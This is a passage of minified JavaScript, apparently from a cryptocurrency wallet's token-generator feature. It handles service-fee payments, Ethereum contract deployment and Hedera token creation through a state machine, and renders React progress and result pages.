            async waitExchangeTxFinished(e) {
                const {transactionId: t} = e
                  , {status: a, ...n} = await this.reduxActions.getExchangeTransaction({
                    id: t,
                    partner: "changenow"
                });
                if (a && "finished" === a)
                    return {
                        hash: null == n ? void 0 : n.payoutHash,
                        transactionId: t
                    };
                throw SkippedError(`Exchange transaction is not finished, current status of transaction is ${a}`, Kle.EXCHANGE_TX_IS_NOT_FINISHED, e, n)
            }
            async sendServiceFeeTx(e) {
                throw new Error("not implemented")
            }
            async sendCreateTokenTx() {
                throw new Error("not implemented")
            }
            async getCreateTokenTxResult(e) {
                throw new Error("not implemented")
            }
            async getTxConfirmation(e) {
                throw new Error("not implemented")
            }
            static getComputedProps(e) {
                throw new Error("not implemented")
            }
        }
        const zle = AbstractTokenGenerator
          , jle = "0x243d763b99eE0414031Ea0be3cCb94aF7c513B5f";
        class EthTokenCreator extends zle {
            constructor(e, t) {
                const {freezeDefault: a} = null == e ? void 0 : e.token
                  , n = "1" === a ? Ule : Gle;
                super({
                    ...e,
                    smartContract: n
                }, t)
            }
            async sendServiceFeeTx(e) {
                const {token: t, serviceFee: a, wallet: n} = this
                  , r = await Se.Z.getApiByCurrency(null == n ? void 0 : n.currency)
                  , l = Object.getPrototypeOf(this).constructor.getComputedProps(t)
                  , s = await r.calculateGasLimitForContractDeployment(this.smartContract, t.type, l, n.address)
                  , i = await r.getGasPrice()
                  , {fee: o} = await r.getFee({
                    gasLimit: s,
                    gasPrice: i
                })
                  , c = this.exchange && null != e && e.value ? (0,
                Ko.h9)(null == e ? void 0 : e.value, o).toString() : (0,
                Ko.h9)(a, o).toString()
                  , u = Number(c)
                  , d = Math.max(0, u).toString()
                  , m = {
                    addressFrom: n.address,
                    addressTo: jle,
                    isFeeIncluded: !0,
                    privateKey: n.privateKey,
                    amount: d,
                    gasPrice: i
                }
                  , {hash: p, error: f} = await r.sendTransaction(m);
                if (!p) {
                    const e = m;
                    e.privateKey = "";
                    throw TokenCreatorError(null != f ? f : "Failed to send service fee tx", Vle.ERROR_SENDING_SERVICE_FEE_TX, e, {
                        hash: p,
                        error: f
                    })
                }
                return {
                    hash: p
                }
            }
            async sendCreateTokenTx() {
                const {token: e, wallet: t} = this
                  , a = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , n = undefined
                  , r = (await a.compileContract(a.DEFAULT_SOLC_VERSION, this.smartContract)).contracts["token.sol"][`${e.type}`]
                  , l = Object.getPrototypeOf(this).constructor.getComputedProps(e)
                  , s = await a.calculateGasLimitForContractDeployment(this.smartContract, e.type, l, t.address)
                  , i = await a.getGasPrice()
                  , o = await a.buildContractData(r, l, t.address)
                  , c = a.web3.utils.toWei(i.toString(), "gwei")
                  , u = a.web3.utils.fromWei((0,
                Ko.$q)(s, c).toString())
                  , d = {
                    data: o.data,
                    wallet: t,
                    from: t.address,
                    gasLimit: String(s),
                    gasPrice: c
                };
                if ((0,
                Ko.lt)(t.balance, u))
                    throw TokenCreatorError("failed to publish smart contract", Vle.INSUFFICIENT_FUNDS, d, "Insufficient funds for gas * price");
                const m = await a.sendCommonTransaction(d);
                if (!m)
                    throw TokenCreatorError("failed to publish smart contract", Vle.ERROR_PUBLISHING_CONTRACT, d, m);
                return {
                    hash: m
                }
            }
            async getCreateTokenTxResult(e) {
                let {hash: t} = e;
                const {wallet: a} = this
                  , n = await Se.Z.getApiByCurrency(null == a ? void 0 : a.currency)
                  , {transactionHash: r, contractAddress: l} = await n.web3.eth.getTransactionReceipt(t);
                return {
                    hash: r,
                    contractAddress: l || ""
                }
            }
            async getTxConfirmation(e) {
                const {wallet: t} = this
                  , a = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , n = await a.getConfirmations(e.hash);
                if (!n)
                    throw SkippedError("Transaction is not confirmed", Kle.TX_IS_NOT_CONFIRMED, e, n);
                const r = await a.web3.eth.getTransaction(e.hash);
                if (null != r && r.value) {
                    const e = a.web3.utils.fromWei(r.value, "ether");
                    return {
                        ...r,
                        value: e
                    }
                }
                return r
            }
            static getComputedProps(e) {
                const t = +e.decimals || 8
                  , a = +e.initialSupply || 1e8
                  , n = (0,
                Ko.yF)((0,
                Ko.$q)(a, `1e${t}`)).replace(/,/g, "").replace(/\s/g, "");
                return [e.name, e.symbol, t, n]
            }
        }
        const $le = EthTokenCreator
          , Zle = M.CM ? "0.0.2533026" : "0.0.647748";
        class HbarTokenCreator extends zle {
            constructor(e, t) {
                super(e, t)
            }
            async sendServiceFeeTx() {
                const {serviceFee: e, wallet: t} = this
                  , a = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , {fee: n} = await a.getFee()
                  , r = Number((0,
                Ko.h9)(null == e ? void 0 : e.toString(), n).toString())
                  , l = Math.max(0, r).toString()
                  , s = (0,
                CE.T9)(t.privateKey);
                if (!s)
                    throw TokenCreatorError("Private Key is undefined", Vle.PRIVATE_KEY_NOT_DEFINED, t, void 0);
                const i = {
                    currency: t.currency,
                    addressFrom: t.address,
                    addressTo: Zle,
                    isFeeIncluded: !0,
                    privateKey: s,
                    amount: l
                }
                  , {hash: o, transactionId: c} = await a.sendTransaction(i);
                if (!o) {
                    const e = i;
                    e.privateKey = "";
                    throw TokenCreatorError("Failed to send service fee tx", Vle.ERROR_SENDING_SERVICE_FEE_TX, e, {
                        hash: o,
                        transactionId: c
                    })
                }
                return {
                    hash: o,
                    transactionId: c
                }
            }
            async sendCreateTokenTx() {
                const {wallet: e, token: t} = this
                  , a = await Se.Z.getApiByCurrency(null == e ? void 0 : e.currency)
                  , {createTokenFee: n} = await a.getFee()
                  , r = Object.getPrototypeOf(this).constructor.getComputedProps(t)
                  , {privateKey: l} = e
                  , s = (0,
                CE.T9)(l);
                if (!s)
                    throw TokenCreatorError("Private Key is undefined", Vle.PRIVATE_KEY_NOT_DEFINED, e, void 0);
                const i = {
                    ...e,
                    privateKey: s
                }
                  , o = {
                    ...r,
                    treasury: e.address
                };
                if ((0,
                Ko.lt)(e.balance, n))
                    throw TokenCreatorError("Failed to create token tx", Vle.INSUFFICIENT_FUNDS, o, {});
                try {
                    const {tokenId: e, transactionId: t, hash: n} = await a.createTokenTransaction(o, i);
                    if (!t || !e)
                        throw TokenCreatorError("Failed to create token tx", Vle.ERROR_CREATING_TOKEN, [o, i], {
                            tokenId: e,
                            transactionId: t,
                            hash: n
                        });
                    return {
                        hash: n,
                        transactionId: t,
                        contractAddress: e
                    }
                } catch (e) {
                    var c;
                    if ("INSUFFICIENT_PAYER_BALANCE" === (null == e || null === (c = e.status) || void 0 === c ? void 0 : c.toString()))
                        throw TokenCreatorError("Failed to create token tx", Vle.INSUFFICIENT_FUNDS, o, {});
                    throw e
                }
            }
            async getCreateTokenTxResult(e) {
                const {wallet: t} = this
                  , {contractAddress: a} = e
                  , n = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , r = await (null == n ? void 0 : n.getTokenInfo(a))
                  , l = undefined;
                if (!(r && r.get(a)))
                    throw SkippedError("Token id not found", Kle.TOKEN_IS_NOT_FOUND, r, {
                        contractAddress: a
                    });
                return e
            }
            async getTxConfirmation(e) {
                const {wallet: t} = this
                  , a = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , n = undefined;
                return await a.getTransactionConfirmation(this.transactionIdFix(e))
            }
            transactionIdFix(e) {
                if (!e || !e.transactionId)
                    return e;
                const [t,a] = e.transactionId.split("@");
                return {
                    ...e,
                    transactionId: [t, a.replace(/\./, "-")].join("-")
                }
            }
            static getComputedProps(e) {
                const t = e.decimals || 8
                  , a = e.initialSupply || "100000000"
                  , n = (0,
                Ko.yF)((0,
                Ko.$q)(a, `1e${t}`)).replace(/,/gi, "").replace(/\s/g, "");
                return {
                    ...e,
                    decimals: t,
                    initialSupply: n,
                    freezeDefault: "1" === e.freezeDefault,
                    freezeKey: "1" === e.freezeKey,
                    adminKey: "1" === e.adminKey,
                    kycKey: "1" === e.kycKey,
                    wipeKey: "1" === e.wipeKey,
                    supplyKey: "1" === e.supplyKey,
                    autoRenewalKey: "1" === e.autoRenewalKey,
                    customFee: 0
                }
            }
        }
        const Yle = HbarTokenCreator
          , getTokenCreatorInstance = (e, t) => {
            const {network: a} = e;
            switch (a) {
            case PW.eth:
                return new $le(e,t);
            case PW.hbar:
                return new Yle(e,t)
            }
            throw Error("Network is not supported")
        }
        ;
        function token_creator_engine_defineProperty(e, t, a) {
            (t = token_creator_engine_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function token_creator_engine_toPropertyKey(e) {
            var t = token_creator_engine_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function token_creator_engine_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        var qle;
        !function(e) {
            e.exchange = "exchange";
            e.serviceFee = "serviceFee";
            e.create = "create"
        }(qle || (qle = {}));
        const Xle = {
            [qle.create]: ee.P.create({
                name: "token-generator-state-create"
            }),
            [qle.exchange]: ee.P.create({
                name: "token-generator-state-exchange"
            }),
            [qle.serviceFee]: ee.P.create({
                name: "token-generator-state-serviceFee"
            })
        }
          , Qle = "standby"
          , Jle = "launching"
          , ese = "sendExchangeTx"
          , tse = "waitExchangeTxFinished"
          , ase = "waitExchangeTxConfirmed"
          , nse = "sendServiceFeeTx"
          , rse = "waitServiceFeeTxConfirmed"
          , lse = "sendCreateTokenTx"
          , sse = "waitCreateTokenTxConfirmed"
          , ise = "getCreateTokenTxResult"
          , ose = "handlingError";
        class TokenCreatorEngine {
            constructor(e, t, a) {
                var n = this;
                token_creator_engine_defineProperty(this, "reduxActions", void 0);
                token_creator_engine_defineProperty(this, "creator", void 0);
                token_creator_engine_defineProperty(this, "stateMachine", void 0);
                token_creator_engine_defineProperty(this, "hooks", []);
                token_creator_engine_defineProperty(this, "state", {
                    step: "",
                    exchange: {},
                    serviceFee: {},
                    create: {}
                });
                token_creator_engine_defineProperty(this, "onError", (async e => {
                    await this.logToServer(this.computedLogState(ose));
                    this.toStep(ose)
                }
                ));
                token_creator_engine_defineProperty(this, "tryCatch", (e => async () => {
                    try {
                        await e()
                    } catch (e) {
                        this.onError(e)
                    }
                }
                ));
                token_creator_engine_defineProperty(this, "addHooks", (e => {
                    this.hooks = e
                }
                ));
                token_creator_engine_defineProperty(this, "executeHook", (async function() {
                    const {state: e} = n.stateMachine
                      , t = n.hooks.find((t => t.state === e));
                    t && t.hook && await t.hook(...arguments)
                }
                ));
                token_creator_engine_defineProperty(this, "logToServer", (e => {
                    U.nW.post("/api/v1/internal/token-generator/log", {
                        logData: e
                    }).catch()
                }
                ));
                token_creator_engine_defineProperty(this, "toStep", (async function(e) {
                    let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    await n.logToServer(n.computedLogState(e));
                    t && await n.persistFsmState(n.computedPersistState(e));
                    n.log(" Goto ", e);
                    setTimeout((async () => {
                        n.stateMachine.goTo(e)
                    }
                    ), 0)
                }
                ));
                token_creator_engine_defineProperty(this, "computedPersistState", (e => {
                    const t = {
                        internalState: {
                            ...this.state,
                            step: e
                        },
                        serviceFee: this.creator.serviceFee,
                        network: this.creator.network,
                        token: this.creator.token,
                        wallet: this.creator.wallet.uuid
                    };
                    return this.creator.exchange && "object" == typeof this.creator.exchange ? {
                        ...t,
                        exchange: {
                            fromWallet: this.creator.exchange.fromWallet.uuid,
                            toWallet: this.creator.exchange.toWallet.uuid
                        }
                    } : t
                }
                ));
                token_creator_engine_defineProperty(this, "computedLogState", (e => {
                    const t = {
                        internalState: {
                            ...this.state,
                            step: e
                        },
                        serviceFee: this.creator.serviceFee,
                        network: this.creator.network,
                        token: this.creator.token,
                        wallet: this.creator.wallet.address
                    };
                    return this.creator.exchange && "object" == typeof this.creator.exchange ? {
                        ...t,
                        exchange: {
                            fromWallet: this.creator.exchange.fromWallet.address,
                            toWallet: this.creator.exchange.toWallet.address
                        }
                    } : t
                }
                ));
                token_creator_engine_defineProperty(this, "persistFsmState", (e => {
                    this.reduxActions.setSecureData(je, e)
                }
                ));
                a && (this.state = a);
                this.reduxActions = t;
                this.creator = getTokenCreatorInstance(e, t);
                this.stateMachine = new (jE())({
                    init: Qle,
                    transitions: [{
                        name: "goTo",
                        from: "*",
                        to: e => e
                    }],
                    methods: {
                        onLaunching: async () => {
                            await this.executeHook();
                            this.toStep(ese)
                        }
                        ,
                        onSendExchangeTx: this.tryCatch((async () => {
                            this.log(" Start ", "Send exchange transaction");
                            const e = await retry(this.creator.sendExchangeTx.bind(this.creator));
                            this.log("  End  ", "Send exchange transaction");
                            if (null == e || !e.hash)
                                throw Error("The hash of the transaction sending the exchange is not defined");
                            this.setState(qle.exchange, {
                                send: e
                            });
                            this.toStep(tse, !1)
                        }
                        )),
                        onWaitExchangeTxFinished: this.tryCatch((async () => {
                            var e;
                            const t = null === (e = this.getState(qle.exchange)) || void 0 === e ? void 0 : e.send;
                            this.log(" Start ", "Wait exchange transaction confirmation");
                            const a = await retry(this.creator.waitExchangeTxFinished.bind(this.creator), t);
                            this.log("  End  ", "Wait exchange transaction confirmation");
                            if (null == a || !a.hash)
                                throw Error("The hash of the completion of the exchange transaction is not defined");
                            this.setState(qle.exchange, {
                                finish: a
                            });
                            this.toStep(ase, !1)
                        }
                        )),
                        onWaitExchangeTxConfirmed: this.tryCatch((async () => {
                            await this.executeHook();
                            const e = this.getState(qle.exchange)
                              , t = await retry(this.creator.getTxConfirmation.bind(this.creator), e);
                            if (null == t || !t.hash)
                                throw Error("The confirmation hash of the exchange operation is not defined");
                            this.setState(qle.exchange, {
                                confirm: t
                            });
                            this.toStep(nse, !1)
                        }
                        )),
                        onSendServiceFeeTx: this.tryCatch((async () => {
                            var e;
                            await this.executeHook();
                            const t = null === (e = this.getState(qle.exchange)) || void 0 === e ? void 0 : e.confirm;
                            this.log(" Start ", "Send service fee transaction");
                            const a = await retry(this.creator.sendServiceFeeTx.bind(this.creator), t);
                            this.log("  End  ", "Send service fee transaction");
                            if (null == a || !a.hash)
                                throw Error("The hash of the transaction sending the service fee is not defined");
                            this.setState(qle.serviceFee, {
                                send: a
                            });
                            this.toStep(rse)
                        }
                        )),
                        onWaitServiceFeeTxConfirmed: this.tryCatch((async () => {
                            var e;
                            const t = null === (e = this.getState(qle.serviceFee)) || void 0 === e ? void 0 : e.send;
                            this.log(" Start ", "Wait service fee transaction confirmed");
                            const a = await retry(this.creator.getTxConfirmation.bind(this.creator), t);
                            this.log("  End  ", "Wait service fee transaction confirmed");
                            if (null == a || !a.hash)
                                throw Error("The confirmation hash of the send service fee operation is not defined");
                            this.setState(qle.serviceFee, {
                                confirm: a
                            });
                            this.toStep(lse)
                        }
                        )),
                        onSendCreateTokenTx: this.tryCatch((async () => {
                            this.log(" Start ", "Send create token transaction");
                            const e = await retry(this.creator.sendCreateTokenTx.bind(this.creator));
                            this.log("  End  ", "Send create token transaction");
                            if (null == e || !e.hash)
                                throw Error("The hash of the transaction sending the create token is not defined");
                            this.setState(qle.create, {
                                send: e
                            });
                            this.toStep(sse)
                        }
                        )),
                        onWaitCreateTokenTxConfirmed: this.tryCatch((async () => {
                            var e;
                            const t = null === (e = this.getState(qle.create)) || void 0 === e ? void 0 : e.send;
                            await this.executeHook(t);
                            this.log(" Start ", "Wait create token transaction confirmed");
                            const a = await retry(this.creator.getTxConfirmation.bind(this.creator), t);
                            this.log("  End  ", "Wait create token transaction confirmed");
                            if (null == a || !a.hash)
                                throw Error("The confirmation hash of the send create token operation is not defined");
                            this.setState(qle.create, {
                                finish: a
                            });
                            this.toStep(ise)
                        }
                        )),
                        onGetCreateTokenTxResult: this.tryCatch((async () => {
                            var e;
                            const t = this.getState(qle.create)
                              , hasContractAddress = e => "contractAddress"in e && e.contractAddress
                              , a = null === (e = Object.values(t).find(hasContractAddress)) || void 0 === e ? void 0 : e.contractAddress;
                            this.log(" Start ", "Get create token transaction result");
                            const n = await retry(this.creator.getCreateTokenTxResult.bind(this.creator), {
                                ...null == t ? void 0 : t.finish,
                                contractAddress: a
                            });
                            this.log("  End  ", "Get create token transaction result");
                            await this.persistFsmState(null);
                            const {token: r, network: l, wallet: s} = this.creator;
                            await TokenStateApi.saveState({
                                address: s.address,
                                family: l,
                                ticker: r.symbol,
                                token: {
                                    contract: (null == n ? void 0 : n.contractAddress) || a,
                                    decimals: r.decimals,
                                    supply: r.initialSupply,
                                    symbol: r.symbol,
                                    title: r.name
                                }
                            });
                            if (null != n && n.contractAddress) {
                                this.setState(qle.create, {
                                    confirm: n
                                });
                                await this.executeHook(null == n ? void 0 : n.contractAddress)
                            }
                        }
                        ))
                    }
                })
            }
            log(e, t) {
                if (M.CM)
                    switch (e.trim()) {
                    case "Start":
                        console.log(`%c[token-generator] %c${e}`, "color: darkorange;", "color: white; background-color: #2274A5", t);
                        break;
                    case "End":
                        console.log(`%c[token-generator] %c${e}`, "color: darkorange;", "color: white; background-color: #95B46A", t);
                        break;
                    case "Goto":
                        console.log(`%c[token-generator] %c${e}`, "color: darkorange;", "color: white; background-color: green", t);
                        break;
                    default:
                        console.log("%c[token-generator]", "color: darkorange;", e, t)
                    }
            }
            setState(e, t) {
                const a = e in this.state && this.state[e];
                this.state[e] = a ? {
                    ...a,
                    ...t
                } : t;
                M.CM && Xle[e].log(t)
            }
            getState(e) {
                return this.state[e]
            }
            start(e) {
                try {
                    var t;
                    this.log("START STATE MACHINE");
                    if (e) {
                        this.log(" Goto ", `Previous state found: "${e}", will restore`);
                        this.stateMachine.goTo(Qle);
                        this.stateMachine.goTo(e);
                        return
                    }
                    if (null === (t = this.creator) || void 0 === t || !t.exchange) {
                        this.stateMachine.goTo(nse);
                        return
                    }
                    this.stateMachine.goTo(Jle)
                } catch (e) {
                    this.toStep(ose)
                }
            }
        }
        const cse = TokenCreatorEngine
          , use = "process_headingWrapper_16-1D"
          , dse = "process_subtitleWrapper_F9CIz"
          , mse = "process_iconProgress_qrnoe"
          , pse = "process_message_1Yj28"
          , fse = "process_warningIcon_2Ag68"
          , Ese = "process_rotating_3YzF5";
        function process_defineProperty(e, t, a) {
            (t = process_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function process_toPropertyKey(e) {
            var t = process_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function process_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class ProcessComponent extends O.Component {
            constructor(e) {
                super(e);
                process_defineProperty(this, "goToStart", ( () => {
                    this.props.history.replace({
                        pathname: "/app/token-generator"
                    })
                }
                ));
                process_defineProperty(this, "onError", (e => {
                    const {selectCreationData: t} = this.props
                      , {wallet: a, token: n} = t;
                    ge.b.error(ge.d.FAILED_CREATE_TOKEN, {
                        error: e,
                        wallet: a.address,
                        token: n
                    });
                    const r = undefined;
                    switch (e.errorCode || e.code) {
                    case Vle.INSUFFICIENT_FUNDS:
                        this.props.toggleDialogInsufficientFunds(!0)();
                        return;
                    case _f().SERVICE_UNAVAILABLE:
                        this.props.toggleDialogServiceUnavailable(!0)();
                        return;
                    default:
                        this.props.history.replace({
                            pathname: "/app/token-generator/error"
                        });
                        return
                    }
                }
                ));
                process_defineProperty(this, "handleContinue", (async e => {
                    const {wallet: t, token: a, network: n} = this.props.selectCreationData
                      , {decimals: r, symbol: l, name: s} = a
                      , i = {
                        ticker: l.toLowerCase(),
                        name: s,
                        precision: r || 18,
                        smartContract: e
                    }
                      , o = this.props.selectedWalletById(t.uuid)
                      , c = await this.props.addSubWallet(o, {
                        address: t.address,
                        currency: i.ticker,
                        publicKey: null == t ? void 0 : t.publicKey,
                        privateKey: t.privateKey,
                        precision: i.precision,
                        smartContract: i.smartContract,
                        title: i.name,
                        balance: "0",
                        isCustom: !0
                    });
                    try {
                        await this.props.setActiveWallet(c);
                        await this.props.updateWallet(t)
                    } catch (e) {}
                    cc.$.send(cc.d.TG_CREATE_TOKEN, i.ticker, {
                        contract: i.smartContract
                    });
                    await this.props.setSecureData(je, null);
                    this.props.history.replace({
                        pathname: "/app/token-generator/success",
                        search: objectToString({
                            ...stringToObject(this.props.location.search),
                            name: s,
                            symbol: l,
                            contractAddress: e,
                            network: n
                        })
                    })
                }
                ));
                process_defineProperty(this, "handleDescriptionsAccordingFSMState", ( () => {
                    const {network: e} = this.props.selectCreationData || {};
                    let t = {
                        pageTitle: "Receiving payment",
                        description: O.createElement("span", null, "Your payment is processing. ", O.createElement("br", null), " We'll tell you when it's done…"),
                        subDescription: "Please standby..."
                    };
                    const {currentStep: a} = this.state;
                    switch (a) {
                    case Jle:
                        t.subDescription = "Sending your transaction to the exchange...";
                        break;
                    case tse:
                        t.subDescription = "Waiting for the exchange to reply...";
                        break;
                    case ase:
                        t.subDescription = "Awaiting the exchange confirmation...";
                        break;
                    case nse:
                        t.subDescription = "Sending the exchanged transaction...";
                        break;
                    case rse:
                        t.subDescription = "Awaiting confirmation for the incoming transaction...";
                        break;
                    case lse:
                        switch (e) {
                        case PW.eth:
                            t = {
                                pageTitle: "Deploying contract",
                                description: O.createElement("span", null, "As soon as contract is deployed you will have your token"),
                                subDescription: "Sending the transaction for contract deployment..."
                            };
                            break;
                        case PW.hbar:
                            t = {
                                pageTitle: "Deploying token",
                                description: O.createElement("span", null, "As soon as transaction is confirmed you will have your token"),
                                subDescription: "Sending the transaction for token creation..."
                            }
                        }
                        break;
                    case sse:
                        switch (e) {
                        case PW.eth:
                            const e = `https://etherscan.io/tx/${this.state.contractTxHash.hash}`;
                            t = {
                                pageTitle: "Deploying contract",
                                description: O.createElement("span", null, "You can check contract status on", " ", O.createElement("a", {
                                    rel: "noopener noreferrer",
                                    target: "_blank",
                                    href: e
                                }, "Etherscan")),
                                subDescription: "Awaiting smart contract transaction confirmation..."
                            };
                            break;
                        case PW.hbar:
                            t = {
                                pageTitle: "Deploying token",
                                description: O.createElement("span", null, "As soon as transaction is confirmed you will have your token"),
                                subDescription: "Awaiting transaction confirmation..."
                            }
                        }
                        break;
                    case ise:
                        window.history.pushState(null, document.title, location.href)
                    }
                    return t
                }
                ));
                this.state = stringToObject(e.location.search);
                this.state = {
                    ...this.state,
                    currentStep: Jle
                }
            }
            async componentDidMount() {
                const e = this.props.selectCreationData
                  , t = {
                    createExchangeTransaction: this.props.createExchangeTransaction,
                    getExchangeTransaction: this.props.getExchangeTransaction,
                    setSecureData: this.props.setSecureData
                };
                if (null == e || !e.token || null == e || !e.wallet) {
                    this.goToStart();
                    return
                }
                const {internalState: a, ...n} = e
                  , r = new cse(n,t,a);
                this.props.setCreatorEngineRef(r);
                r.addHooks([{
                    state: Jle,
                    hook: () => this.setState({
                        currentStep: Jle
                    })
                }, {
                    state: tse,
                    hook: () => this.setState({
                        currentStep: tse
                    })
                }, {
                    state: ase,
                    hook: () => this.setState({
                        currentStep: ase
                    })
                }, {
                    state: nse,
                    hook: () => this.setState({
                        currentStep: nse
                    })
                }, {
                    state: rse,
                    hook: () => this.setState({
                        currentStep: rse
                    })
                }, {
                    state: lse,
                    hook: () => this.setState({
                        currentStep: lse
                    })
                }, {
                    state: sse,
                    hook: e => this.setState({
                        currentStep: sse,
                        contractTxHash: e
                    })
                }, {
                    state: ise,
                    hook: e => this.handleContinue(e)
                }]);
                r.onError = this.onError;
                r.start(a ? a.step : null)
            }
            render() {
                const e = this.handleDescriptionsAccordingFSMState();
                return O.createElement(O.Fragment, null, O.createElement("div", {
                    className: "col-xs-12"
                }, O.createElement("div", {
                    className: use
                }, e.pageTitle), O.createElement("p", {
                    className: dse
                }, e.description)), O.createElement("div", {
                    className: "col-xs-4 col-xs-offset-4"
                }, O.createElement("div", {
                    className: mse
                }, O.createElement("img", {
                    className: Ese,
                    src: Yte,
                    alt: ""
                }), O.createElement("br", null), O.createElement("br", null), O.createElement("p", null, e.subDescription)), O.createElement(ui_message, {
                    className: pse,
                    type: "warning"
                }, O.createElement("div", {
                    className: fse
                }), "Please wait for the success screen, it may take a few minutes. Before that, do not close the page and do not open the wallet in another tab.")), O.createElement(stepper, {
                    step: 3
                }))
            }
        }
        ProcessComponent.propTypes = {
            location: as().object.isRequired,
            history: as().object.isRequired,
            addSubWallet: as().func,
            setCreatorEngineRef: as().func,
            selectedWalletById: as().func,
            toggleDialogInsufficientFunds: as().func,
            toggleDialogServiceUnavailable: as().func,
            selectCreationData: as().object,
            createExchangeTransaction: as().func,
            getExchangeTransaction: as().func,
            updateWallet: as().func,
            setActiveWallet: as().func,
            setSecureData: as().func
        };
        const hse = (0,
        Mle.qC)((0,
        $.$j)((0,
        _t.zB)({
            selectedWalletById: eu
        }), {
            addSubWallet,
            setActiveWallet,
            updateWallet: updateWalletsBalanceAndTxs,
            createExchangeTransaction,
            getExchangeTransaction,
            setSecureData
        }))(ProcessComponent)
          , usePopupInsufficientFunds = () => {
            const [e,t] = (0,
            O.useState)(!1)
              , a = (0,
            O.useCallback)((e => () => t(e)), [t])
              , n = (0,
            O.useCallback)((t => {
                let {wallet: n, handleTopUpWallet: r, handleTryAgain: l} = t;
                return O.createElement(aa, {
                    onClose: a(!1),
                    unclosable: !0,
                    visible: e,
                    width: 450
                }, O.createElement("div", {
                    className: Ht()(Gre, Kre)
                }, O.createElement("h2", null, "Insufficient funds."), O.createElement("p", {
                    className: ele
                }, "Not enough funds to deploy the token. Top up your balance and return to the Token generator to continue."), O.createElement("div", {
                    className: qre
                }, O.createElement(Yl, {
                    color: "blue",
                    onClick: e => r(n, e)
                }, "Top up wallet"), O.createElement(Yl, {
                    color: "light-blue",
                    onClick: e => l(n, e)
                }, "Try again"))))
            }
            ), [a, e]);
            return {
                isOpen: e,
                toggleDialog: a,
                Dialog: n
            }
        }
          , usePopupServiceUnavailable = () => {
            const [e,t] = (0,
            O.useState)(!1)
              , a = (0,
            O.useCallback)((e => () => t(e)), [t])
              , n = (0,
            O.useCallback)((t => {
                let {wallet: n, handleTopUpWallet: r, handleTryAgain: l} = t;
                return O.createElement(aa, {
                    onClose: a(!1),
                    unclosable: !0,
                    visible: e,
                    width: 450
                }, O.createElement("div", {
                    className: Ht()(Gre, Kre)
                }, O.createElement("h2", null, "Network error."), O.createElement("p", {
                    className: ele
                }, "Service is currently unavailable. To continue, just return to the Token generator later."), O.createElement("div", {
                    className: qre
                }, O.createElement(Yl, {
                    color: "blue",
                    onClick: e => l(n, e)
                }, "Try again"), O.createElement(Yl, {
                    color: "light-blue",
                    onClick: e => r(n, e)
                }, "Return to wallet"))))
            }
            ), [a, e]);
            return {
                isOpen: e,
                toggleDialog: a,
                Dialog: n
            }
        }
          , ProcessPage = e => {
            var t;
            const {history: a} = e
              , n = (0,
            $.v9)(selectCreationData)
              , [r,l] = (0,
            O.useState)(null)
              , {toggleDialog: s, Dialog: i} = usePopupInsufficientFunds()
              , {toggleDialog: o, Dialog: c} = usePopupServiceUnavailable()
              , u = (0,
            O.useCallback)((e => {
                a.replace(`/app/receive?wallet=${e.uuid}`)
            }
            ), [a])
              , d = (0,
            O.useCallback)(( () => {
                if (n && null != n && n.internalState) {
                    null == r || r.start(null == n ? void 0 : n.internalState.step);
                    s(!1)()
                }
            }
            ), [r, null == n || null === (t = n.internalState) || void 0 === t ? void 0 : t.step])
              , m = {
                ...e,
                selectCreationData: n,
                toggleDialogInsufficientFunds: s,
                toggleDialogServiceUnavailable: o,
                setCreatorEngineRef: l
            };
            return O.createElement(lle, null, O.createElement(c, {
                wallet: (null == n ? void 0 : n.wallet) || {},
                handleTopUpWallet: u,
                handleTryAgain: d
            }), O.createElement(i, {
                wallet: (null == n ? void 0 : n.wallet) || {},
                handleTopUpWallet: u,
                handleTryAgain: d
            }), O.createElement(hse, m))
        }
          , gse = ProcessPage
          , yse = a.p + "assets/images/1pp8U63.jpg"
          , vse = a.p + "a1c726dabddac0d564c7df76cdee4c7a.svg"
          , _se = "success_headingWrapper_ZzFwX"
          , wse = "success_placeholderImage_3Ow62"
          , bse = "success_titleBlock_1FR9p"
          , kse = "success_imgPlaceholderWrapper_23B09"
          , Sse = "success_buttons_1CSGZ"
          , Cse = "success_textBlock_1hU30"
          , Nse = "success_banner_3SaZu"
          , Tse = "success_dashedButton_2vdaJ styles_dashedNormal_xEvl8"
          , Ase = "success_infoPlaceholderWrapper_3EYD3";
        function CreateTokenSuccess() {
            const {contractAddress: e, symbol: t, name: a, network: n} = useLocationSearch()
              , r = (0,
            j.k6)()
              , goToGuarda = () => r.replace({
                pathname: "/app"
            })
              , l = (0,
            O.useMemo)(( () => {
                if (!e)
                    return {};
                switch (n) {
                case PW.eth:
                    return {
                        text: "Your contract address is stored on Etherscan:",
                        link: (0,
                        be.Au)(n, n, e)
                    };
                case PW.hbar:
                    return {
                        text: "Your token Id is stored on Dragonglass:",
                        link: (0,
                        be.Kb)(n, n, e)
                    };
                default:
                    return {}
                }
            }
            ), [e, n]);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement("div", {
                className: _se
            }, "Token created")), O.createElement("div", {
                className: Ht()("col-xs-6", kse)
            }, O.createElement("div", {
                className: bse
            }, O.createElement("img", {
                src: vse,
                alt: ""
